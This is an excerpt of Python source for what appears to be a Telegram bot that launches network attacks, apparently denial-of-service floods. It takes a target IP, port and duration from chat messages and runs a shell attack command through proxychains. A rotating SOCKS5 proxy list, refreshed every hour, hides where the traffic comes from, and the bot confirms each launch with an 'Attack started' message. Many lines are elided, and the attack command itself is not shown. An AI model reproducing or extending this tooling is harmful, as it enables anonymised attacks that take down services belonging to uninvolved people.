...
FORWARD_CHANNEL_ID = -4264690402
CHANNEL_ID = -4264690402
error_channel_id = -4264690402
...
def create_proxychains_conf(proxy):
    config = f"""
strict_chain
proxy_dns
...
def update_proxy_list():
    try:
        ...
        global proxy_list
        proxy_list = [f"socks5 {proxy}" for proxy in new_proxies] + proxy_list
        logging.info(f"Updated proxy list. New count: {len(proxy_list)}")
...
def auto_update_proxy_list():
    while True:
        update_proxy_list()
        time.sleep(3600)  # Update proxy list every hour
...
async def run_attack_command_async(target_ip, target_port, duration, proxy):
    ...
    process = await asyncio.create_subprocess_shell(command, env={"PROXYCHAINS_CONF_FILE": proxy})
...
def process_attack_command(message):
    try:
        ...
        proxy_conf = create_proxychains_conf(proxy)
        
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration, proxy_conf), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}\nProxy: {proxy}*", parse_mode='Markdown')
    except Exception as e:
...
if __name__ == "__main__":
    ...
    proxy_update_thread = Thread(target=auto_update_proxy_list, daemon=True)
    proxy_update_thread.start()
